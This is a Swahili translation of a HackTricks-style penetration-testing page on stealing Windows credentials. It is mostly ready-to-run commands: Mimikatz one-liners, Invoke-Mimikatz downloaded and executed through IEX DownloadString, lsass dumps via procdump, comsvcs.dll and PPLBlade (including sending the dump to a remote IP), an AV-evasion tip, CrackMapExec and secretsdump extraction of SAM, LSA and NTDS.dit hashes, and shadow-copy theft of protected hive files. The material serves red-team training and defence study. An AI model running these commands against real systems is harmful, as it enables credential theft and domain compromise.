# Kuiba Akida za Windows

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}

## Akida Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pata mambo mengine ambayo Mimikatz inaweza kufanya katika** [**ukurasa huu**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Jifunze kuhusu baadhi ya ulinzi wa akidi hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutolewa baadhi ya akidi.**

## Akidi na Meterpreter

Tumia [**Kipengele cha Akidi**](https://github.com/carlospolop/MSF-Credentials) **ambacho** nimeunda ili **kutafuta nywila na hash** ndani ya mwathirika.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Kupita AV

### Procdump + Mimikatz

Kama **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni chombo halali cha Microsoft**, hakigunduliwi na Defender.\
Unaweza kutumia chombo hiki **kudondosha mchakato wa lsass**, **kupakua dump** na **kutoa** **akikazi kwa ndani** kutoka kwa dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Toa akidi kutoka kwenye dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Mchakato huu unafanywa kiotomatiki kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** zinaweza **kubaini** kama **hatari** matumizi ya **procdump.exe kutekeleza lsass.exe**, hii ni kwa sababu wanabaini mfuatano wa **"procdump.exe" na "lsass.exe"**. Hivyo ni **rahisi zaidi** **kupitisha** kama **hoja** **PID** ya lsass.exe kwa procdump **badala ya** jina la **lsass.exe.**

### Kutekeleza lsass kwa kutumia **comsvcs.dll**

DLL inayojulikana kama **comsvcs.dll** iliyopo katika `C:\Windows\System32` inawajibika kwa **kutekeleza kumbukumbu ya mchakato** katika tukio la ajali. DLL hii ina **kazi** inayojulikana kama **`MiniDumpW`**, iliyoundwa kutumika kwa `rundll32.exe`.\
Ni muhimu kutumia hoja mbili za kwanza, lakini ya tatu imegawanywa katika vipengele vitatu. Kitambulisho cha mchakato kinachotakiwa kutekelezwa kinaunda kipengele cha kwanza, mahali pa faili ya dump inawakilisha cha pili, na kipengele cha tatu ni neno **full**. Hakuna chaguo mbadala.\
Baada ya kuchambua vipengele hivi vitatu, DLL inahusika katika kuunda faili ya dump na kuhamasisha kumbukumbu ya mchakato ulioainishwa katika faili hii.\
Matumizi ya **comsvcs.dll** yanawezekana kwa kutekeleza mchakato wa lsass, hivyo kuondoa haja ya kupakia na kutekeleza procdump. Njia hii imeelezwa kwa undani zaidi katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Amri ifuatayo inatumika kwa utekelezaji:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Unaweza kujiandaa mchakato huu kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Kutoa lsass kwa kutumia Meneja wa Kazi**

1. Bonyeza kulia kwenye Kichupo cha Kazi na bonyeza kwenye Meneja wa Kazi
2. Bonyeza kwenye Maelezo zaidi
3. Tafuta mchakato wa "Local Security Authority Process" kwenye tab ya Mchakato
4. Bonyeza kulia kwenye mchakato wa "Local Security Authority Process" na bonyeza kwenye "Create dump file".

### Kutoa lsass kwa kutumia procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyosainiwa na Microsoft ambayo ni sehemu ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni Zana ya Kutoa Mchakato Iliohifadhiwa inayounga mkono kuficha mchakato wa kumbukumbu na kuhamasisha kwenye vituo vya mbali bila kuacha kwenye diski.

**Mifumo muhimu**:

1. Kupita ulinzi wa PPL
2. Kuficha faili za mchakato wa kumbukumbu ili kuepuka mifumo ya kugundua inayotegemea saini ya Defender
3. Kupakia mchakato wa kumbukumbu kwa njia za RAW na SMB bila kuacha kwenye diski (kutoa bila faili)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Pata hash za SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dumisha siri za LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dumisha NTDS.dit kutoka DC lengwa
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dumisha historia ya nywila ya NTDS.dit kutoka kwa DC lengwa
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Hizi faili zinapaswa **kuwa** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi tu kuziandika kwa njia ya kawaida** kwa sababu zimehifadhiwa.

### From Registry

Njia rahisi ya kuiba hizi faili ni kupata nakala kutoka kwenye rejista:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pakua** hizo faili kwenye mashine yako ya Kali na **toa hash** kwa kutumia:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Unaweza kufanya nakala ya faili zilizolindwa ukitumia huduma hii. Unahitaji kuwa Msimamizi.

#### Kutumia vssadmin

Faili ya vssadmin inapatikana tu katika toleo za Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Lakini unaweza kufanya vivyo hivyo kutoka **Powershell**. Hii ni mfano wa **jinsi ya kunakili faili ya SAM** (diski ngumu inayotumika ni "C:" na inahifadhiwa kwenye C:\users\Public) lakini unaweza kutumia hii kwa kunakili faili yoyote iliyo na ulinzi:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Hatimaye, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kufanya nakala ya SAM, SYSTEM na ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Akida za Active Directory - NTDS.dit**

Faili la **NTDS.dit** linajulikana kama moyo wa **Active Directory**, likihifadhi data muhimu kuhusu vitu vya mtumiaji, vikundi, na uanachama wao. Hapa ndipo **hashes za nywila** za watumiaji wa kikoa zinahifadhiwa. Faili hii ni **Extensible Storage Engine (ESE)** database na inapatikana katika **_%SystemRoom%/NTDS/ntds.dit_**.

Katika database hii, meza tatu kuu zinahifadhiwa:

- **Meza ya Data**: Meza hii ina jukumu la kuhifadhi maelezo kuhusu vitu kama watumiaji na vikundi.
- **Meza ya Kiungo**: Inafuatilia uhusiano, kama vile uanachama wa vikundi.
- **Meza ya SD**: **Maelezo ya usalama** kwa kila kitu yanashikiliwa hapa, kuhakikisha usalama na udhibiti wa ufikiaji kwa vitu vilivyohifadhiwa.

Taarifa zaidi kuhusu hii: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows inatumia _Ntdsa.dll_ kuingiliana na faili hiyo na inatumika na _lsass.exe_. Kisha, **sehemu** ya faili la **NTDS.dit** inaweza kupatikana **ndani ya `lsass`** kumbukumbu (unaweza kupata data iliyofikiwa hivi karibuni labda kwa sababu ya kuboresha utendaji kwa kutumia **cache**).

#### Kufungua hashes ndani ya NTDS.dit

Hash inafichwa mara 3:

1. Fungua Funguo la Usimbaji wa Nywila (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
2. Fungua **hash** kwa kutumia **PEK** na **RC4**.
3. Fungua **hash** kwa kutumia **DES**.

**PEK** ina **thamani sawa** katika **kila kidhibiti cha kikoa**, lakini inafichwa ndani ya faili ya **NTDS.dit** kwa kutumia **BOOTKEY** ya **faili ya SYSTEM ya kidhibiti cha kikoa (ni tofauti kati ya vidhibiti vya kikoa)**. Hii ndiyo sababu ili kupata akida kutoka kwa faili la NTDS.dit **unahitaji faili NTDS.dit na SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Nakala ya NTDS.dit kwa kutumia Ntdsutil

Inapatikana tangu Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
You could also use the [**volume shadow copy**](./#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).

### **Kutoa hash kutoka NTDS.dit**

Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Unaweza pia **kuzipata kiotomatiki** kwa kutumia mtumiaji halali wa admin wa kikoa:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Kwa **faili kubwa za NTDS.dit** inashauriwa kuzitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Hatimaye, unaweza pia kutumia **moduli ya metasploit**: _post/windows/gather/credentials/domain\_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa vitu vya kikoa kutoka NTDS.dit hadi kwenye hifadhidata ya SQLite**

Vitu vya NTDS vinaweza kutolewa kwenye hifadhidata ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio siri pekee zinazotolewa bali pia vitu vyote na sifa zao kwa ajili ya uchimbaji wa taarifa zaidi wakati faili ghafi ya NTDS.dit tayari imeshapatikana.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive ni hiari lakini inaruhusu ufichuzi wa siri (NT & LM hashes, nyongeza za akidi kama nywila za wazi, funguo za kerberos au imani, historia za nywila za NT & LM). Pamoja na taarifa nyingine, data ifuatayo inachukuliwa: akaunti za mtumiaji na mashine zikiwa na hashes zao, bendera za UAC, alama ya wakati wa kuingia kwa mwisho na mabadiliko ya nywila, maelezo ya akaunti, majina, UPN, SPN, vikundi na uanachama wa kurudi, mti wa vitengo vya shirika na uanachama, maeneo ya kuaminika yenye aina za imani, mwelekeo na sifa...

## Lazagne

Pakua binary kutoka [hapa](https://github.com/AlessandroZ/LaZagne/releases). unaweza kutumia binary hii kutoa akidi kutoka kwa programu kadhaa.
```
lazagne.exe all
```
## Other tools for extracting credentials from SAM and LSASS

### Windows credentials Editor (WCE)

Zana hili linaweza kutumika kutoa akiba kutoka kwenye kumbukumbu. Pakua kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Toa akiba kutoka kwenye faili ya SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Toa akisi kutoka kwa faili la SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pakua kutoka: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) na **tekeleza tu** na nywila zitapatikana.

## Defenses

[**Jifunze kuhusu baadhi ya ulinzi wa akidi hapa.**](credentials-protections.md)

{% hint style="success" %}
Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
